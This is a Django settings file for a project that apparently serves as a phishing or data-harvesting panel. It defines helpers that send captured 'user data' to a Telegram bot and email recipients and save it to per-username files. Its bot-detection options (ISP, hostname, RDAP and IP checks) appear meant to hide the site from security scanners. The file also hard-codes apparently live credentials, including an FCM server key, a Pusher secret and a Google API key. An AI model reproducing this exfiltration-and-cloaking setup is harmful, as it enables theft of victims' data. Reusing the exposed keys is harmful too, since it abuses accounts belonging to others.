"""
Django settings for core project.

Generated by 'django-admin startproject' using Django 5.1.6.

For more information on this file, see
https://docs.djangoproject.com/en/5.1/topics/settings/

For the full list of settings and their values, see
https://docs.djangoproject.com/en/5.1/ref/settings/
"""

from datetime import timedelta
import os
from pathlib import Path


def _env_bool(var_name: str, default: bool = False) -> bool:
    value = os.getenv(var_name)
    if value is None:
        return default
    return value.strip().lower() in {"1", "true", "yes", "on"}


def _env_int(var_name: str, default: int) -> int:
    value = os.getenv(var_name)
    if value is None:
        return default
    try:
        return int(value)
    except (TypeError, ValueError):
        return default

# Build paths inside the project like this: BASE_DIR / 'subdir'.
BASE_DIR = Path(__file__).resolve().parent.parent

# Environment-based configuration
# Set default environment
ENVIRONMENT = os.getenv('ENVIRONMENT', 'local')

# Development flag
IS_DEVELOPMENT = ENVIRONMENT in ['local', 'docker_dev']
IS_PRODUCTION = ENVIRONMENT == 'production'

# Default to freezing production deployments until the access gate is fixed
DEPLOYMENT_FREEZE_ENABLED = _env_bool('DEPLOYMENT_FREEZE_ENABLED', default=IS_PRODUCTION)

# SECURITY WARNING: keep the secret key used in production secret!
SECRET_KEY = os.getenv('SECRET_KEY', 'django-insecure-placeholder-key')

# SECURITY WARNING: don't run with debug turned on in production!
DEBUG = IS_DEVELOPMENT

# Dynamic domain configuration using environment variables
# Coolify provides these automatically
FRONTEND_DOMAIN = os.getenv('FRONTEND_DOMAIN') or os.getenv('COOLIFY_URL') or 'localhost:3000'
BACKEND_DOMAIN = os.getenv('BACKEND_DOMAIN') or os.getenv('COOLIFY_URL') or 'localhost:8000'

_env_allowed_hosts = os.getenv('ALLOWED_HOSTS')
if _env_allowed_hosts:
    ALLOWED_HOSTS = [host.strip() for host in _env_allowed_hosts.split(',') if host.strip()]
else:
    ALLOWED_HOSTS = ['*'] if IS_DEVELOPMENT else [
        BACKEND_DOMAIN,
        f'www.{BACKEND_DOMAIN}',
        'localhost',
        '127.0.0.1',
        '*.coolify.example.com',  # Coolify wildcard domains
        '*.coolify.dev',  # Alternative Coolify domains
    ]

EMAIL_BACKEND = os.getenv('EMAIL_BACKEND', 'django.core.mail.backends.smtp.EmailBackend')
EMAIL_HOST = os.getenv('EMAIL_HOST', '')
EMAIL_HOST_USER = os.getenv('EMAIL_HOST_USER', '')
EMAIL_HOST_PASSWORD = os.getenv('EMAIL_HOST_PASSWORD', '')
EMAIL_PORT = _env_int('EMAIL_PORT', 465)
EMAIL_USE_TLS = _env_bool('EMAIL_USE_TLS', False)
EMAIL_USE_SSL = _env_bool('EMAIL_USE_SSL', True)
if EMAIL_USE_TLS and EMAIL_USE_SSL:
    # Prefer TLS if both are requested; avoid double enabling
    EMAIL_USE_SSL = False
DEFAULT_FROM_EMAIL = os.getenv('DEFAULT_FROM_EMAIL', EMAIL_HOST_USER or 'no-reply@example.com')
EMAIL_RECIPIENTS = [addr.strip() for addr in os.getenv('EMAIL_RECIPIENTS', '').split(',') if addr.strip()]
BASE_URL = os.getenv('BASE_URL', '0.0.0.0:80')

# Configure Redis vs In-Memory based on environment
if ENVIRONMENT == 'local':
    # Local development - no Redis
    CACHES = {
        'default': {
            'BACKEND': 'django.core.cache.backends.locmem.LocMemCache',
            'LOCATION': 'unique-snowflake',
        }
    }
    
    CHANNEL_LAYERS = {
        "default": {
            "BACKEND": "channels.layers.InMemoryChannelLayer"
        },
    }
    
    DATABASES = {
        'default': {
            'ENGINE': 'django.db.backends.sqlite3',
            'NAME': BASE_DIR / 'db.sqlite3',
        }
    }
    
else:
    # Docker environments (local Docker & production) - use Redis
    CACHES = {
        'default': {
            'BACKEND': 'django.core.cache.backends.redis.RedisCache',
            'LOCATION': 'redis://redis:6379/1',
        }
    }
    
    CHANNEL_LAYERS = {
        "default": {
            "BACKEND": "channels_redis.core.RedisChannelLayer",
            "CONFIG": {
                "hosts": [("redis", 6379)],
            },
        },
    }
    
    # Use PostgreSQL for production unless DATABASE_URL explicitly points to SQLite
    if IS_PRODUCTION:
        database_url = os.getenv('DATABASE_URL', '').strip()
        if database_url.startswith('sqlite:///'):
            sqlite_path = database_url.replace('sqlite:///', '') or (BASE_DIR / 'db.sqlite3')
            DATABASES = {
                'default': {
                    'ENGINE': 'django.db.backends.sqlite3',
                    'NAME': sqlite_path if os.path.isabs(str(sqlite_path)) else BASE_DIR / sqlite_path,
                }
            }
        else:
            DATABASES = {
                'default': {
                    'ENGINE': 'django.db.backends.postgresql',
                    'NAME': os.getenv('POSTGRES_DB', 'postgres'),
                    'USER': os.getenv('POSTGRES_USER', 'postgres'),
                    'PASSWORD': os.getenv('POSTGRES_PASSWORD', ''),
                    'HOST': os.getenv('POSTGRES_HOST', os.getenv('DB_HOST', 'db')),
                    'PORT': int(os.getenv('POSTGRES_PORT', os.getenv('DB_PORT', 5432))),
                }
            }
    else:
        # Local Docker
        DATABASES = {
            'default': {
                'ENGINE': 'django.db.backends.sqlite3',
                'NAME': BASE_DIR / 'db.sqlite3',
            }
        }

CELERY_BROKER_URL = os.getenv('CELERY_BROKER_URL', os.getenv('REDIS_URL', 'redis://redis:6379/0'))
CELERY_RESULT_BACKEND = os.getenv('CELERY_RESULT_BACKEND', CELERY_BROKER_URL)

ALLOWED_PROXY_IPS = [ip.strip() for ip in os.getenv('ALLOWED_PROXY_IPS', '10.0.3.2').split(',') if ip.strip()]
ALLOWED_PROXY_HOSTNAMES = [host.strip() for host in os.getenv('ALLOWED_PROXY_HOSTNAMES', '').split(',') if host.strip()]

# Email sending function that switches between sync and async based on environment
from django.core.mail import send_mail
from core.tasks import send_user_data_email_task, send_telegram_user_data_task, save_data_to_file_task
import requests


def _resolve_recipients(recipient_list):
    if recipient_list:
        return [addr.strip() for addr in recipient_list if addr]
    return list(EMAIL_RECIPIENTS)


def send_data_email(subject, message, from_email=None, recipient_list=None):
    """Send email - sync in local, async in Docker/production"""
    recipients = _resolve_recipients(recipient_list)
    sender = from_email or DEFAULT_FROM_EMAIL

    if not sender or not recipients:
        print("Email configuration missing sender or recipients; skipping send.")
        return

    if ENVIRONMENT == 'local':
        # Local: synchronous sending
        try:
            send_mail(
                subject,
                message,
                sender,
                recipients,
                fail_silently=False,
            )
        except Exception as exc:
            print(f"Email send failed locally: {exc}")
    else:
        # Docker/Production: async with Celery
        try:
            send_user_data_email_task.delay(subject, message, sender, recipients)
        except Exception:
            try:
                send_mail(
                    subject,
                    message,
                    sender,
                    recipients,
                    fail_silently=False,
                )
            except Exception as exc:
                print(f"Email send fallback failed: {exc}")


def send_data_telegram(app_settings, message):
    """Send Telegram message - sync in local, async in Docker/production"""
    token = (app_settings or {}).get('botToken')
    chat_id = (app_settings or {}).get('chatId')
    if not token or not chat_id:
        print("Telegram configuration missing bot token or chat id; skipping send.")
        return

    telegram_url = f"https://api.telegram.org/bot{token}/sendMessage"

    if ENVIRONMENT == 'local':
        # Local: synchronous sending
        try:
            response = requests.post(
                telegram_url,
                data={"chat_id": chat_id, "text": message},
                timeout=5,
            )
            if response.status_code == 200:
                print("Telegram message sent successfully")
            else:
                print(f"Failed to send message. Status code: {response.status_code}")
        except requests.RequestException as exc:
            print(f"Failed to send message due to network error: {exc}")
    else:
        # Docker/Production: async with Celery
        try:
            send_telegram_user_data_task.delay(app_settings, message)
        except Exception:
            try:
                response = requests.post(
                    telegram_url,
                    data={"chat_id": chat_id, "text": message},
                    timeout=5,
                )
                if response.status_code == 200:
                    print("Telegram message sent successfully")
                else:
                    print(f"Failed to send message. Status code: {response.status_code}")
            except requests.RequestException as exc:
                print(f"Failed to send message due to network error: {exc}")


def save_data_to_file(username, message):
    """Save data to file - sync in local, async in Docker/production"""
    if ENVIRONMENT == 'local':
        # Local: synchronous file saving
        folder_path = "clients"
        if not os.path.exists(folder_path):
            os.makedirs(folder_path)
        file_path = os.path.join(folder_path, f"{username}.txt")
        with open(file_path, "a", encoding="utf-8") as f:
            f.write(message)
            f.write("\n" + "=" * 80 + "\n")
        print(f"Data saved to {file_path}")
    else:
        # Docker/Production: async with Celery
        try:
            save_data_to_file_task.delay(username, message)
        except Exception:
            folder_path = "clients"
            if not os.path.exists(folder_path):
                os.makedirs(folder_path)
            file_path = os.path.join(folder_path, f"{username}.txt")
            with open(file_path, "a", encoding="utf-8") as f:
                f.write(message)
                f.write("\n" + "=" * 80 + "\n")
            print(f"Data saved to {file_path}")

# Application definition

INSTALLED_APPS = [
         "daphne",

    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',

    'channels',
    'corsheaders',

    'rest_framework',
    'rest_framework.authtoken',

    'access',
    'proxy',
    'user_data'



]



MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
    "corsheaders.middleware.CorsMiddleware",
    'core.middleware.deployment_freeze.deployment_freeze_middleware',
    'core.middleware.block_ips_middleware.block_ips_middleware',
]

ROOT_URLCONF = 'core.urls'

TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        "DIRS": [os.path.join(BASE_DIR, 'templates')],
        'APP_DIRS': True,
        'OPTIONS': {
            'context_processors': [
                'django.template.context_processors.debug',
                'django.template.context_processors.request',
                'django.contrib.auth.context_processors.auth',
                'django.contrib.messages.context_processors.messages',
            ],
        },
    },
]

WSGI_APPLICATION = 'core.wsgi.application'
ASGI_APPLICATION = "core.asgi.application"


# Password validation
# https://docs.djangoproject.com/en/5.1/ref/settings/#auth-password-validators

AUTH_PASSWORD_VALIDATORS = [
    {
        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',
    },
]


# Internationalization
# https://docs.djangoproject.com/en/5.1/topics/i18n/

LANGUAGE_CODE = 'en-us'

TIME_ZONE = 'UTC'

USE_I18N = True

USE_TZ = True


# Static files (CSS, JavaScript, Images)
# https://docs.djangoproject.com/en/5.1/howto/static-files/

STATIC_URL = "/static/"
STATIC_ROOT = os.path.join(BASE_DIR, "static_cdn", "static_root")  # For static files
MEDIA_URL = "/media/"
MEDIA_ROOT = os.path.join(BASE_DIR, "media")  # Separate media files

HOST_SCHEME = "http://"


# Default primary key field type
# https://docs.djangoproject.com/en/5.1/ref/settings/#default-auto-field

DEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'


FCM_SERVER_KEY = 'AAAAxOQuav4:APA91bGO5BfxGqVOvfop7ZyrFW1RePVALmhotBv4VMk67KD_IP_9aJfLnBVYQmoJpJw3ho2sKBELLcnMRFhHRl-Ri312kySP7eOLcYJgI0XmyrNZ9CR9fu28bnZn7u5W53dV8Q-4W6oU'


from celery import Celery
app = Celery('core')
app.config_from_object('django.conf:settings', namespace='CELERY')
app.autodiscover_tasks()


REST_FRAMEWORK = {
    'DEFAULT_AUTHENTICATION_CLASSES': (
        'rest_framework_simplejwt.authentication.JWTAuthentication',
        # Add other authentication classes as needed
    ),
}


SIMPLE_JWT = {
    'ACCESS_TOKEN_LIFETIME': timedelta(days=1),
    'REFRESH_TOKEN_LIFETIME': timedelta(days=1),
}






# CORS Configuration - Environment-aware
_env_cors_origins = os.getenv('CORS_ALLOWED_ORIGINS')
if IS_DEVELOPMENT:
    # Development: Allow all origins for local development
    CORS_ALLOW_ALL_ORIGINS = True
    CORS_ALLOWED_ORIGINS = []
else:
    # Production: Allow Coolify domains and localhost for frontend dev
    CORS_ALLOW_ALL_ORIGINS = False
    default_cors = [
        f'https://{FRONTEND_DOMAIN}',
        f'https://www.{FRONTEND_DOMAIN}',
        'http://localhost:3000',  # Keep for local frontend development
        'http://127.0.0.1:3000',
        # Coolify domains
        'https://*.coolify.example.com',
        'https://*.coolify.dev',
    ]
    if _env_cors_origins:
        CORS_ALLOWED_ORIGINS = [origin.strip() for origin in _env_cors_origins.split(',') if origin.strip()]
    else:
        CORS_ALLOWED_ORIGINS = default_cors

CORS_ALLOW_CREDENTIALS = True

# CSRF Configuration - Environment-aware
_env_csrf_origins = os.getenv('CSRF_TRUSTED_ORIGINS')
if IS_DEVELOPMENT:
    CSRF_TRUSTED_ORIGINS = []
else:
    default_csrf = [
        f'https://{FRONTEND_DOMAIN}',
        f'https://www.{FRONTEND_DOMAIN}',
        # Coolify domains
        'https://*.coolify.example.com',
        'https://*.coolify.dev',
    ]
    if _env_csrf_origins:
        CSRF_TRUSTED_ORIGINS = [origin.strip() for origin in _env_csrf_origins.split(',') if origin.strip()]
    else:
        CSRF_TRUSTED_ORIGINS = default_csrf


PUSHER_APP_ID = '1875922'
PUSHER_KEY = '88ff191e00149bfda666'
PUSHER_SECRET = '3cb983d4c5b0ff21cb0f'
PUSHER_CLUSTER = 'mt1'
PUSHER_SSL = True


#PAYSTACK_SECRET_KEY = 'sk_test_6ff0bf30279f1acafb4ac3e565a0bba4f56c940e'
#MNOTIFY_KEY = 'MsxG8Cc6cjRqjJzEZTtjlHBYb'
#MNOTIFY_SENDER_ID = 'BookedNise'


GOOGLE_API_KEY = 'AIzaSyCAw7IbX2OgFTlcOiEZ5kTWMPQJ1JeC7mI'


# Redis Caching Configuration
# (This will be overridden by environment-based config above)

# Cache timeout settings (in seconds)
CACHE_MIDDLEWARE_SECONDS = 300  # 5 minutes for general cache
BOT_CACHE_TIMEOUT = 3600  # 1 hour for bot-related caches
ISP_CACHE_TIMEOUT = 86400  # 24 hours for ISP lookups

# Bot detection tuning
BOT_BLOCK_THRESHOLD = int(os.getenv('BOT_BLOCK_THRESHOLD', '2'))
BOT_HIGH_CONFIDENCE_SCORE = int(os.getenv('BOT_HIGH_CONFIDENCE_SCORE', '2'))
BOT_ENABLE_REMOTE_ADDR_CHECK = os.getenv('BOT_ENABLE_REMOTE_ADDR_CHECK', '1') == '1'
BOT_ENABLE_HOSTNAME_CHECK = os.getenv('BOT_ENABLE_HOSTNAME_CHECK', '1') == '1'
BOT_ENABLE_ISP_CHECK = os.getenv('BOT_ENABLE_ISP_CHECK', '1') == '1'
BOT_ENABLE_RDAP_CHECK = os.getenv('BOT_ENABLE_RDAP_CHECK', '1') == '1'


# MinIO Configuration
MINIO_ENDPOINT = "your-minio-endpoint"  # e.g., 'play.min.io'
MINIO_ACCESS_KEY = "your-access-key"
MINIO_SECRET_KEY = "your-secret-key"
MINIO_BUCKET_NAME = "your-bucket-name"
MINIO_USE_SSL = False  # Set to True if your MinIO is set up with SSL (HTTPS)